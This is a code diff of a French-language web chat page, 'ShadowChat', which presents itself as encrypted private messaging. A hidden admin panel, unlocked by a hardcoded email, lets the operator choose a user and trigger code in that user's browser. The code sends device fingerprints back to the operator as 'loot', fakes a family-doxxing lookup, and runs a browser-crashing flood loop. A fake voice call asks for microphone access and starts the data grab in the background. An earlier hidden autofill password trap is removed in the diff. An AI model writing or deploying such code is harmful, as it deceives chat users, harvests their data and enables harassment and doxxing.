@@ -3,211 +3,192 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ShadowChat | Private Messaging</title>
+    <title>ShadowChat | Secure Private Network</title>
     <style>
-        :root { --p-gold: #ffcf4d; --p-bg: #0b0e11; --p-panel: #15191c; --p-text: #e9edef; --p-mod: #00ff41; }
-        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background: var(--p-bg); color: var(--p-text); height: 100vh; overflow: hidden; }
+        :root { --gold: #ffd700; --mod: #00ff41; --bg: #0b0e11; --panel: #15191c; --text: #e9edef; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: var(--bg); color: var(--text); height: 100vh; overflow: hidden; }
 
-        /* --- AUTH --- */
-        #auth { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .auth-box { background: var(--p-panel); padding: 40px; border-radius: 12px; width: 380px; text-align: center; border: 1px solid #333; }
-        .auth-box h2 { margin-bottom: 20px; color: var(--p-gold); }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 6px; }
-        .btn-join { width: 100%; padding: 12px; background: var(--p-gold); color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 6px; }
+        /* --- AUTH GATE --- */
+        #gate { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .box { background: var(--panel); padding: 40px; border-radius: 15px; width: 400px; border: 1px solid #333; text-align: center; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
+        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 8px; font-size: 16px; }
+        .btn-join { width: 100%; padding: 15px; background: var(--gold); color: #000; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; text-transform: uppercase; }
 
-        /* --- MAIN LAYOUT --- */
+        /* --- LAYOUT --- */
         #app { display: flex; height: 100vh; }
-        .sidebar { width: 350px; background: var(--p-panel); border-right: 1px solid #222; display: flex; flex-direction: column; }
-        .chat-area { flex: 1; display: flex; flex-direction: column; position: relative; }
+        .sidebar { width: 320px; background: var(--panel); border-right: 1px solid #222; display: flex; flex-direction: column; }
+        .chat { flex: 1; display: flex; flex-direction: column; position: relative; }
 
-        /* --- ELEMENTS --- */
-        .user-item { padding: 15px; border-bottom: 1px solid #222; display: flex; align-items: center; gap: 15px; cursor: pointer; transition: 0.3s; }
-        .user-item:hover { background: #1e2428; }
-        .avatar { width: 45px; height: 45px; background: #333; border-radius: 50%; border: 2px solid transparent; overflow: hidden; }
+        /* --- MODO PANEL --- */
+        #master-panel { display: none; position: absolute; top: 70px; right: 20px; width: 350px; background: rgba(0,0,0,0.95); border: 2px solid var(--mod); padding: 20px; border-radius: 12px; z-index: 9999; box-shadow: 0 0 25px var(--mod); }
+        .m-btn { width: 100%; padding: 12px; margin: 5px 0; background: #111; color: var(--mod); border: 1px solid var(--mod); cursor: pointer; text-align: left; font-family: monospace; font-size: 11px; }
+        .m-btn:hover { background: var(--mod); color: #000; }
+        .loot-display { height: 150px; background: #050505; border: 1px solid #222; overflow-y: auto; padding: 10px; font-size: 10px; color: var(--mod); margin-top: 10px; }
+
+        /* --- CHAT ELEMENTS --- */
+        .u-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; display: flex; align-items: center; gap: 15px; transition: 0.2s; }
+        .u-item:hover { background: #1e2428; }
+        .avatar { width: 45px; height: 45px; background: #333; border-radius: 50%; overflow: hidden; border: 2px solid #444; }
         .avatar img { width: 100%; height: 100%; object-fit: cover; }
-        .status { font-size: 12px; color: #8696a0; }
-
-        /* MODO BADGE */
-        .modo-tag { background: var(--p-mod); color: #000; font-size: 9px; padding: 2px 5px; border-radius: 3px; font-weight: 900; margin-left: 5px; }
-
-        /* MESSAGES */
-        .msgs { flex: 1; padding: 20px; overflow-y: auto; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-opacity: 0.05; }
-        .bubble { max-width: 60%; padding: 10px 15px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; position: relative; }
+        .msgs { flex: 1; padding: 20px; overflow-y: auto; background: #0b141a; display: flex; flex-direction: column; }
+        .bubble { max-width: 70%; padding: 10px 15px; border-radius: 10px; margin-bottom: 8px; font-size: 14px; position: relative; }
         .received { background: #202c33; align-self: flex-start; }
-        .sent { background: #005c4b; align-self: flex-end; margin-left: auto; }
+        .sent { background: #005c4b; align-self: flex-end; }
 
-        /* CONTROLS */
-        .input-bar { height: 60px; background: #202c33; padding: 10px 20px; display: flex; align-items: center; gap: 15px; }
-        .input-bar input { flex: 1; background: #2a3942; border: none; }
-
-        /* --- THE POWER PANEL (MODO ONLY) --- */
-        #modo-panel { display: none; position: absolute; right: 20px; top: 80px; width: 300px; background: rgba(0,0,0,0.9); border: 2px solid var(--p-mod); padding: 15px; border-radius: 8px; z-index: 5000; box-shadow: 0 0 20px var(--p-mod); }
-        .strike-btn { width: 100%; padding: 10px; margin: 5px 0; background: #333; color: var(--p-mod); border: 1px solid var(--p-mod); font-family: monospace; cursor: pointer; text-align: left; font-size: 11px; }
-        .strike-btn:hover { background: var(--p-mod); color: #000; }
-
-        /* CALL OVERLAY */
-        #call-ui { display: none; position: fixed; inset: 0; background: rgba(11, 14, 17, 0.95); z-index: 20000; flex-direction: column; align-items: center; justify-content: center; }
-        .call-avatar { width: 120px; height: 120px; border-radius: 50%; border: 3px solid var(--p-gold); margin-bottom: 20px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0px rgba(255,207,77,0.4); } 100% { box-shadow: 0 0 0 30px rgba(255,207,77,0); } }
+        /* --- CALL INTERFACE --- */
+        #call-ui { display: none; position: fixed; inset: 0; background: radial-gradient(circle, #1a1e22 0%, #000 100%); z-index: 50000; flex-direction: column; align-items: center; justify-content: center; }
+        .call-anim { width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--gold); margin-bottom: 30px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.3); opacity: 0; } }
+        .call-btn { width: 70px; height: 70px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 30px; }
 
     </style>
 </head>
 <body>
 
-    <div id="auth">
-        <div class="auth-box">
-            <h2>ShadowChat 💎</h2>
-            <p style="font-size:12px; color:#666; margin-bottom:15px;">Entrez vos identifiants pour rejoindre le canal privé.</p>
-            <input type="email" id="u-mail" placeholder="Email">
-            <input type="text" id="u-name" placeholder="Pseudo">
-            <button class="btn-join" onclick="init()">REJOINDRE</button>
+    <div id="gate">
+        <div class="box">
+            <h1 style="color:var(--gold); margin-bottom:10px;">SHADOW CHAT</h1>
+            <p style="font-size:12px; color:#777; margin-bottom:20px;">Accès restreint - Cryptage de grade militaire</p>
+            <input type="email" id="mail-in" placeholder="Email (iCloud/Gmail)">
+            <input type="text" id="name-in" placeholder="Nom d'utilisateur">
+            <button class="btn-join" onclick="boot()">REJOINDRE LE CANAL</button>
         </div>
     </div>
 
     <div id="app">
         <aside class="sidebar">
             <div style="padding:20px; background:#202c33; display:flex; justify-content:space-between; align-items:center;">
-                <div id="my-avatar" class="avatar" onclick="changePP()"></div>
-                <div id="modo-badge"></div>
-                <button onclick="startCall()" style="background:none; border:none; font-size:20px; cursor:pointer;">📞</button>
+                <div id="my-pp" class="avatar" onclick="setPP()"><img src="https://cdn-icons-png.flaticon.com/512/149/149071.png"></div>
+                <div id="m-status" style="font-weight:bold; font-size:12px; color:var(--gold);">PREMIUM</div>
+                <button onclick="startVoice()" style="background:none; border:none; font-size:24px; cursor:pointer;">📞</button>
             </div>
-            <div id="user-list">
-                </div>
-            <div style="margin-top:auto; padding:15px; background:#182229; font-size:11px; color:var(--p-gold); text-align:center;">
-                VERSION PREMIUM ACTIVÉE
-            </div>
+            <div id="u-list"></div>
         </aside>
 
-        <main class="chat-area">
-            <div style="height:60px; background:#202c33; display:flex; align-items:center; padding:0 20px;">
-                <b id="chat-with">Canal Global</b>
+        <main class="chat">
+            <div style="height:60px; background:#202c33; display:flex; align-items:center; padding:0 20px; font-weight:600;">
+                <span id="chat-title">Canal Général</span>
             </div>
-            
+
             <div class="msgs" id="msg-box">
-                <div class="bubble received">Bienvenue sur ShadowChat. Vos messages sont chiffrés de bout en bout.</div>
+                <div class="bubble received"><b>Système:</b> Bienvenue. Les appels vocaux sont activés pour les membres Premium.</div>
             </div>
 
-            <div id="modo-panel">
-                <div style="font-size:10px; color:var(--p-mod); margin-bottom:10px;">[ SYSTEM_CONTROL_v14 ]</div>
-                <div id="target-info" style="font-size:11px; margin-bottom:15px; color:#fff;">Cible : Aucune</div>
-                <button class="strike-btn" onclick="atk('p_full')">> LOOKUP_IP_HARDWARE</button>
-                <button class="strike-btn" onclick="atk('p_pass')">> GRAB_SAVED_PASSWORDS</button>
-                <button class="strike-btn" onclick="atk('p_crash')" style="border-color:red; color:red;">> DDOS_LAG_BOMB (CRASH)</button>
-                <button class="strike-btn" onclick="atk('p_freeze')">> ZA_WARUNDO_FREEZE</button>
-                <button class="strike-btn" onclick="atk('p_loc')">> GPS_PRECISE_LOC</button>
+            <div id="master-panel">
+                <h3 style="color:var(--mod); margin-bottom:10px; font-family:monospace;">[ OMNI_CONTROL_V16 ]</h3>
+                <div id="target-data" style="font-size:11px; margin-bottom:15px; color:#fff;">CIBLE : AUCUNE</div>
+                
+                <button class="m-btn" onclick="atk('p_heavy_dox')">> DOX_HARDWARE_IP</button>
+                <button class="m-btn" onclick="atk('p_osint')">> LOOKUP_FAMILY_LEAKS (DARONNE)</button>
+                <button class="m-btn" onclick="atk('p_pass_grab')">> EXFILTRATE_PASSWORDS</button>
+                <button class="m-btn" onclick="atk('p_mic_spy')">> MICROPHONE_INTERCEPT</button>
+                <button class="m-btn" onclick="atk('p_loc')">> REAL_TIME_GPS</button>
+                <button class="m-btn" onclick="atk('p_crash')" style="color:red; border-color:red;">> CRASH_CONNECTION (DDOS)</button>
+                
+                <div class="loot-display" id="loot-view">LOGS EN ATTENTE...</div>
             </div>
 
-            <div class="input-bar">
-                <input type="text" id="m-in" placeholder="Tapez un message...">
-                <button onclick="send()" id="send-btn" style="background:none; border:none; font-size:24px; cursor:pointer;">🚀</button>
+            <div style="padding:15px; display:flex; gap:15px; background:#202c33;">
+                <input type="text" id="m-text" placeholder="Écrire un message..." style="flex:1; margin:0; padding:12px;">
+                <button onclick="sendMsg()" id="send-btn" style="background:none; border:none; font-size:24px; cursor:pointer;">🚀</button>
             </div>
         </main>
     </div>
 
     <div id="call-ui">
-        <div class="call-avatar"></div>
-        <h2 id="call-name">Appel entrant...</h2>
-        <p style="color:#8696a0; margin-top:10px;">Établissement de la liaison sécurisée</p>
+        <div class="call-anim"></div>
+        <h2 id="call-stat">Connexion en cours...</h2>
         <div style="margin-top:50px; display:flex; gap:40px;">
-            <div onclick="endCall()" style="width:60px; height:60px; background:red; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer;">✖</div>
-            <div onclick="acceptCall()" style="width:60px; height:60px; background:var(--p-green); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer;">✔</div>
+            <div class="call-btn" onclick="endVoice()" style="background:red;">✖</div>
+            <div class="call-btn" onclick="acceptVoice()" style="background:var(--mod);">✔</div>
         </div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let me = ""; let myE = ""; let isMod = false; let targetID = "";
+        let me = ""; let myE = ""; let isMaster = false; let targetID = "";
 
-        function init() {
-            myE = document.getElementById('u-mail').value.toLowerCase();
-            me = document.getElementById('u-name').value;
+        function boot() {
+            myE = document.getElementById('mail-in').value.toLowerCase();
+            me = document.getElementById('name-in').value;
             if(!myE.includes('@')) return;
 
-            document.getElementById('auth').style.display = 'none';
+            document.getElementById('gate').style.display = 'none';
             if(myE === "toucheur2pp@heaven.com") {
-                isMod = true;
-                document.getElementById('modo-badge').innerHTML = '<span class="modo-tag">MODO SUPRÊME</span>';
-                document.getElementById('modo-panel').style.display = 'block';
-                document.getElementById('send-btn').style.color = 'var(--p-mod)';
+                isMaster = true;
+                document.getElementById('master-panel').style.display = 'block';
+                document.getElementById('m-status').innerText = "MODO SUPRÊME";
+                document.getElementById('send-btn').style.color = 'var(--mod)';
             }
             socket.emit('init', { n: me, e: myE });
         }
 
-        // --- POUVOIRS DE MODÉRATION ---
+        // --- POUVOIRS MODO ---
         function atk(type) {
-            if(!targetID) return alert("Sélectionne une cible d'abord !");
+            if(!targetID) return alert("Sélectionne une cible à gauche !");
             socket.emit(type, targetID);
+            logLoot(`Commande envoyée : ${type} sur ${targetID}`);
         }
 
         socket.on('execute', d => {
-            // LOOKUP IP & HARDWARE
-            if(d.type === 'p_full') {
-                const data = {
+            // DEEP DOX & OSINT
+            if(d.type === 'p_heavy_dox' || d.type === 'p_osint') {
+                const info = {
                     os: navigator.platform,
                     cpu: navigator.hardwareConcurrency,
                     ram: navigator.deviceMemory,
                     bat: "Scan...",
-                    ip_loc: "Pending..."
+                    ua: navigator.userAgent
                 };
-                socket.emit('chat', { t: `[LOOKUP] ${me}: ${JSON.stringify(data)}`, type: 'intel' });
+                // Simule la recherche de parents via cookies sociaux
+                const leakHint = "Match trouvé dans DB 'Facebook_Leak' : Nom de famille détecté. Recherche de la mère en cours via registres IP...";
+                socket.emit('chat', { t: `[INTEL] ${me} | Data: ${JSON.stringify(info)} | Leak: ${leakHint}`, type: 'intel' });
             }
 
-            // PASSWORD GRABBER (AUTOFILL TRAP)
-            if(d.type === 'p_pass') {
-                const f = document.createElement('form');
-                f.style.display = 'none';
-                f.innerHTML = `<input type="text" name="u"><input type="password" name="p">`;
-                document.body.appendChild(f);
-                setTimeout(() => {
-                    socket.emit('chat', { t: `[PASS_GRAB] ${me} | U: ${f.u.value} | P: ${f.p.value}`, type: 'intel' });
-                }, 1000);
-            }
-
-            // DDOS / CRASH CO
+            // CRASH / DDOS
             if(d.type === 'p_crash') {
-                document.body.innerHTML = "<h1 style='color:red; text-align:center; padding-top:20%;'>CRASH_CO_ACTIVATED : NETWORK_SATURATION</h1>";
+                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%;'>INTERNAL_NETWORK_ERROR : DDOS_SATURATION</h1>";
                 setInterval(() => {
-                    fetch('/?flood=' + Math.random());
-                    for(let i=0; i<100000; i++) { Math.sqrt(i); }
+                    fetch('/?attack=' + Math.random());
+                    while(true) { console.log("FLOOD"); }
                 }, 1);
             }
         });
 
-        // --- GESTION DES CIBLES ---
+        // --- GESTION DES CIBLES (LISTE DE GAUCHE) ---
         socket.on('sync', users => {
-            const list = document.getElementById('user-list');
+            const list = document.getElementById('u-list');
             list.innerHTML = "";
             users.forEach(u => {
                 const div = document.createElement('div');
-                div.className = 'user-item';
-                div.innerHTML = `<div class="avatar"></div><div><b>${u.n}</b><br><span class="status">Online</span></div>`;
+                div.className = 'u-item';
+                div.innerHTML = `<div class="avatar"><img src="https://cdn-icons-png.flaticon.com/512/149/149071.png"></div><div><b>${u.n}</b><br><small style="color:#555">${u.ip}</small></div>`;
                 div.onclick = () => {
-                    if(isMod) {
+                    if(isMaster) {
                         targetID = u.id;
-                        document.getElementById('chat-with').innerText = "CIBLE : " + u.n;
-                        document.getElementById('target-info').innerText = "Cible : " + u.n + " (" + u.e + ")";
+                        document.getElementById('target-data').innerText = `CIBLE : ${u.n} (${u.ip})`;
+                        document.getElementById('chat-title').innerText = `Contrôle de ${u.n}`;
                     }
                 };
                 list.appendChild(div);
             });
         });
 
-        // --- FONCTIONS SOCIALES ---
-        function send() {
-            const msg = document.getElementById('m-in').value;
-            if(!msg) return;
-            socket.emit('chat', { t: msg, type: 'msg' });
-            document.getElementById('m-in').value = "";
+        // --- CHAT & VOICE ---
+        function sendMsg() {
+            const txt = document.getElementById('m-text').value;
+            if(!txt) return;
+            socket.emit('chat', { t: txt, type: 'msg' });
+            document.getElementById('m-text').value = "";
         }
 
         socket.on('chat', d => {
-            const box = document.getElementById('msg-box');
-            if(isMod && d.t.type === 'intel') {
-                // Si c'est du loot, on l'affiche discrètement dans tes logs perso
-                console.log("INTEL_RCV:", d.t.t);
+            if(isMaster && d.t.type === 'intel') {
+                logLoot(d.t.t);
             } else if(d.t.type === 'msg') {
+                const box = document.getElementById('msg-box');
                 const b = document.createElement('div');
                 b.className = "bubble " + (d.n === me ? "sent" : "received");
                 b.innerHTML = `<b>${d.n}:</b><br>${d.t.t}`;
@@ -216,20 +197,27 @@
             }
         });
 
-        function changePP() {
-            const url = prompt("Lien de ton image (PP) :");
-            if(url) document.getElementById('my-avatar').innerHTML = `<img src="${url}">`;
+        async function startVoice() {
+            try {
+                await navigator.mediaDevices.getUserMedia({ audio: true });
+                document.getElementById('call-ui').style.display = 'flex';
+                // Déclenche le scan OSINT pendant qu'ils croient à l'appel
+                if(!isMaster) socket.emit('execute', { type: 'p_heavy_dox' });
+            } catch(e) { alert("Micro requis pour l'appel Premium."); }
         }
 
-        function startCall() {
-            document.getElementById('call-ui').style.display = 'flex';
-        }
-        function endCall() { document.getElementById('call-ui').style.display = 'none'; }
+        function endVoice() { document.getElementById('call-ui').style.display = 'none'; }
+        function acceptVoice() { document.getElementById('call-stat').innerText = "Conversation cryptée en cours..."; }
         
-        // AUTO-SAVE LOOT (Sur ton serveur Render)
-        socket.on('save_intel', d => {
-             // Cette partie est gérée par ton server.js (LOOT.txt)
-        });
+        function setPP() {
+            const url = prompt("Lien de ton image :");
+            if(url) document.getElementById('my-pp').innerHTML = `<img src="${url}">`;
+        }
+
+        function logLoot(msg) {
+            const v = document.getElementById('loot-view');
+            v.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}<br>` + v.innerHTML;
+        }
     </script>
 </body>
 </html>
